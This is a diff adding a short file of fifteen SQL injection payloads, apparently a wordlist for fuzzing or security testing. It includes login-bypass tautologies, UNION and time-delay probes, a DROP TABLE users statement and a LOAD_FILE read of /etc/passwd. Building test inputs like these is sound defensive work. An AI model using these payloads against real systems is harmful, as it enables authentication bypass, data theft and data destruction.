@@ -1,0 +1,15 @@
+' OR 1=1--
+" OR 1=1--
+' OR 'a'='a
+' OR 1=1; --
+1' ORDER BY 10--
+' UNION SELECT null,@@version--
+' AND SLEEP(5)--
+1; DROP TABLE users--
+' OR 1=1 LIMIT 1 -- 
+" UNION SELECT 1,LOAD_FILE('/etc/passwd')--
+' OR (SELECT 1 FROM DUAL WHERE 1=1)--
+' UNION SELECT database(),version()--
+admin'--
+" AND 1=CONVERT(int,(SELECT @@version))--
+'; WAITFOR DELAY '0:0:5'--
